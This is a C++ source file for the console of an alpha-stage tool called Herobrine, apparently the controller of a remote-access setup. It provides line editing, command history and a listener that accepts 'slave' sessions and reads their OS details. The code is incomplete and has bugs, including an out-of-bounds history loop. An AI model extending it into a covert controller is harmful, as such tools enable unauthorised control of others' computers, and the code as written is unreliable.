// Copyright 2019 SMS
// License(GPL)
// Author: ShenMian
// 控制台命令

#include "cmd.h"
#include <conio.h>
#include <thread>
#include "print.h"
#include "slave.h"
#include "tcp_server.h"

namespace cmd
{
const ushort hist_size = 999 + 1;	// 命令历史记录上限, max: 999

list<Slave>			slave;
vector<string>	arg;		// 参数
deque<string>		hist;	// 历史记录

// 命令行
// TODO: 该函数有很大的进步空间
void console()
{
	short				i, j;
	const char* list[] = {
			// 命令匹配列表
			"cls", "clear", "exit", "help", "history", "listen", "ls", "quit", "use"};
	ushort list_size = sizeof(list) / sizeof(char*);
	string cmd;	// 命令

	while (true)
	{
		// 输出命令提示符
		_putch('\n');
		color::mode::underline();
		printf("him");
		color::rest();
		printf("> ");

		color::fore::white();
		color::mode::bold();

		if (hist.size() >= hist_size)	// 历史记录数量达到上限
			hist.pop_back();						 // 将最早的记录出队

		cmd.clear();

		short pList = -1;	// 当前匹配命令在list[]中的下标, 没有匹配项时为-1
		short pHist = -1;	// 当前选中的历史命令在history中的下标

		while (true)
		{
			// 读入命令
			cmd += _getch();

			if (cmd.back() == -32 || cmd.back() == 0)	// 功能键
			{
				cmd.pop_back();
				short code = _getch();	// 功能键ASCII代码

				// 上下键 历史命令切换
				if (code == 72)	// 上键 前移历史纪录指针
				{
					if (pHist == hist.size() - 1)	// 已经是历史记录尾部
						continue;
					pHist++;
				}

				if (code == 80)	// 下键 后移历史纪录指针
				{
					if (pHist == 0)	// 已经是历史记录头部
						continue;
					pHist--;
				}

				if (code == 72 || code == 80)	// 显示历史记录
				{
					for (i = 0; i < cmd.size(); i++)	// 清除已输入的内容
						printf("\b \b");
					printf("%s", hist[pHist].c_str());
					cmd = hist[pHist];
					continue;
				}

				continue;
			}

			// 过滤非法字符
			// TODO: 增加可读性
			if ((cmd.back() < 32 && cmd.back() != '\r' && cmd.back() != '\t' &&
					 cmd.back() != '\b' && cmd.back() != 27) ||
					cmd.back() > 127)
			{
				cmd.pop_back();
				continue;
			}

			// Tab键 补全命令
			if (cmd.back() == '\t')
			{
				cmd.pop_back();
				if (pList == -1)	// 没有匹配项
					continue;
				printf("%s", &list[pList][cmd.size()]);
				cmd += &list[pList][cmd.size()];
				continue;
			}

			// ESC键 清空全部输入
			// 若输入过长导致换行则无能为力
			if (cmd.back() == 27)
			{
				cmd.pop_back();
				for (i = 0; i < cmd.size(); i++) printf("\b \b");
				continue;
			}

			// Enter键 结束命令读入
			if (cmd.back() == '\r')
			{
				cmd.pop_back();
				_putch('\n');
				break;
			}

			// Backspace键 退格
			if (cmd.back() == '\b')
			{
				cmd.pop_back();
				if (cmd.size() > 0)
				{
					printf("\b \b");
					cmd.pop_back();
				}
			}
			else
			{
				_putch(cmd.back());
			}

			// 更新可能的匹配项, 显示标识
			for (i = 0; i < list_size; i++)
			{
				// 排除过短的命令
				if (strlen(list[i]) <= cmd.size() && i + 1 != list_size)
					continue;

				// 逐字匹配
				for (j = 0; j < cmd.size(); j++)
				{
					if (cmd[j] != list[i][j])
						break;
				}

				// 匹配成功
				if (j == cmd.size() && cmd.size() != 0)
				{
					pList = i;
					color::fore::gray();
					printf("%s", &list[pList][cmd.size()]);
					color::fore::white();
					color::mode::bold();
					for (j = cmd.size(); j < strlen(list[pList]); j++) _putch('\b');
					break;
				}

				// 无匹配项
				if (i + 1 == list_size && pList != -1)
				{
					for (j = cmd.size(); j < strlen(list[pList]); j++) _putch(' ');
					for (j = cmd.size(); j < strlen(list[pList]); j++) _putch('\b');
					pList = -1;
				}
			}

			// 溢出检查
			if (cmd.size() >= cmd.max_size())
			{
				print::err("命令过长");
				break;
			}
		}
		color::rest();

		// 命令长度为0
		if (cmd.size() == 0)
			continue;

		// 保存到历史记录
		// TODO: 释放hist.front的剩余空间
		hist.push_front(cmd);

		// 分割命令
		char* str = new char[cmd.size() + 1];
		strcpy(str, cmd.c_str());

		arg.clear();
		// TODO: 无法识别出双引号括起带空格的参数
		char* pToken = strtok(str, " ");
		while (pToken != NULL)
		{
			arg.push_back(pToken);

			if (arg.size() >= arg.max_size())	// 会溢出
				break;

			pToken = strtok(NULL, " ");
		}
		delete[] str;

		if (arg.size() >= arg.max_size())	// 会溢出
		{
			print::err("参数过多");
			continue;
		}


		if (arg[0] == "exit" || arg[0] == "quit")
			exit();
		else if (arg[0] == "cls" || arg[0] == "clear")
			clear();
		else if (arg[0] == "help")
			help();
		else if (arg[0] == "listen")
			listen();
		else if (arg[0] == "history")
			history();
		else if (arg[0] == "banner")
			banner();
		else
			print::err("未知命令: " + arg[0]);
	}
}

// 输出横幅
void banner()
{
	printf(
			"  __      __    __\n"
			" |  |    |  |  |__|   __________\n"
			" |  |____|  |   __   |  __  __  |\n"
			" |   ____   |  |  |  |  ||  ||  |\n"
			" |  |    |  |  |  |  |  ||  ||  |\n"
			" |__|    |__|  |__|  |__||__||__|\n"
			"\n"
			" [Herobrine (Alpha)             ]\n"
			" [Update Date: %-17.17s]\n"
			" [Update Time: %-17.17s]\n",
			__DATE__, __TIME__);
}

// 清空屏幕
void clear()
{
	system("cls");
}

// 管理数据库
void db()
{
	if (arg[1] == "connect")
	{
		// 检查host是否合法

		// 检查port是否合法

		// 检查user是否合法

		// 检查dbname是否合法
	}
}

// 退出控制台
void exit()
{
	if (Slave::size())
	{
		print::warn("还有会话未退出, 是否直接关闭控制台?[Y/n]");
		char choice = _getch();
		if (choice == 'n' || choice == 'N')
			return;
	}
	::exit(0);
}

// 输出命令帮助
void help()
{
	puts(
			"  命令          描述\n"
			"  ----          ----\n"
			"  banner        输出横幅"
			"  clear         清空屏幕\n"
			"  cls           清空屏幕\n"
			"  db            操作数据库\n"
			"  exit          退出控制台\n"
			"  help          输出命令帮助信息\n"
			"  quit          退出控制台\n"
			"  listen        开启监听任务\n"
			"  ls            列出会话\n"
			"  use           打开指定会话");
}

// 输出命令历史纪录
void history()
{
	ushort i;

	puts("  ID 命令");
	puts("  -- ---");
	for (i = hist.size(); i > 0; i--) printf("  %-2d %s\n", i, hist[i].c_str());
}

void thListen(TCPServer sock)
{
	Slave						slave_;
	string					buf;
	os_info_windows osInfoWindows;
	os_info_linux		osInfoLinux;

	slave_.socket(sock.accept());

	// 获取操作系统内核名称和系统基本信息
	slave_.recv(buf);
	slave_.os_info(buf);
	
}

// 监听
void listen()
{
	TCPServer sock;
	thread		pthListen(thListen, sock);

	// 绑定
	if (!sock.bind(atoi(arg[1].c_str())))
	{
		print::err("绑定失败");
		return;
	}

	// 监听
	if (!sock.listen())
	{
		print::err("监听失败");
		return;
	}

	pthListen.detach();

	print::good("成功开启监听任务");
}

}	// namespace cmd
